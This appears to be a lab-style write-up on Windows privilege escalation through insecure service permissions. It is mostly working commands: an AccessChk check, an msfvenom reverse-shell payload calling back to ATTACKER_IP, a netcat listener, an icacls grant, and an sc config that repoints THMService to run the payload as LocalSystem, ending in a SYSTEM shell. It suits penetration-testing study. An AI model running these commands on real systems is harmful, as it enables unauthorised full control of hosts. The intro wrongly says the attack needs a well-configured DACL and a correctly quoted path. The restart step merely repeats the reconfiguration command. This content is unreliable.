---
sidebar_position: 4
---

# Insecure Service Permissions

It is possible taking advantage of a Service if the Service's Executable **`DACL` (Discretionary Access Control Lists )** is well Configured and the Service Binary PATH is rightly Quoted. 
If the Service `DACL` allow us to Modify the Configuration of a Service we will be able to Reconfigure the Service. **(This will allow us to point to any Executable)**

<br/>

- We can use a Tool <b style={{ color: 'LightGreen' }}>AccessChk</b> to check for a Service <span style={{fontWeight: 'Bold'}}>DACL</span> from the <span style={{fontWeight: 'Bold'}}>CMD</span>

```batch
accesschk <file, directory, registry key, process, service, object>
```

---

<br/>


- The Group <b style={{ color: 'PowderBlue' }}>BUILTIN\\Users:(SERVICE_ALL_ACCESS)</b> can Reconfigure any Service.

```log
C:\tools\AccessChk> accesschk64.exe /accepteula
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
// highlight-next-line
        SERVICE_ALL_ACCESS
```

<br/>

- Generating and Transfering the **PAYLOAD**

```bash
attacker@machine:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc.exe
attacker@machine:~$ nc -lvp 4447
```

<br/>

- Granting <b style={{ color: 'PowderBlue' }}>Everyone:(F)</b> Permissions to the <span style={{fontWeight: 'Bold'}}>PAYLOAD</span>

```batch
C:\> icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
```

<br/>


- Modifying the **Service.** We chose <b style={{ color: 'Red' }}>LocalSystem</b> as it is the highest Privileged Account available.

```powershell
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
[SC] ChangingServiceConfig SUCCESS
```

<br/>

- Starting a `netcat` Listener.
- Restarting the <b style={{ color: 'DeepSkyBlue' }}>THMService</b> Service

```powershell
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
[SC] ChangingServiceConfig SUCCESS
```

```bash
attacker@machine:~$ nc -lvp 4447
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM
```